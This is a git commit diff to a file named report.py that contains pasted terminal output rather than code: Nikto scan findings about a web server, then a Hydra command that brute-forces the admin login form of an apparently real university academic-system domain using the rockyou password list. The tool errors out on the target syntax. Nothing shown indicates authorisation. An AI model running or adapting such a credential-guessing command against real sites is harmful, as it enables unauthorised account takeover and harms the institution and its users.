be5e1914c51fe60e176a7e76ec72f34923f2663e
Farras <115802691+miie-fa@users.noreply.github.com>
2025-09-16 23:30:08 +0700

    Update report.py

--- report.py
+++ report.py
@@ -19,3 +19,14 @@
 + /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
 + No CGI Directories found (use '-C all' to force check all possible dirs)
 + /images: The web server may reveal its internal or real IP in the Location header via a request to with HTTP/1.0. The value is "10.130.223.0". See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2000-0649
+
+
+
+
+┌──(lilo㉿lilo)-[/]
+└─$ hydra -l admin -P /usr/share/wordlists/rockyou.txt https://www.siak.polimedia.ac.id/ http-form-post "/login.php:username^USER^&password^PASS^:F=incorrect"
+Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-09-16 23:29:39
+[ERROR] Invalid target definition!
+[ERROR] Either you use "www.example.com module [optional-module-parameters]" *or* you use the "module://www.example.com/optional-module-parameters" syntax!
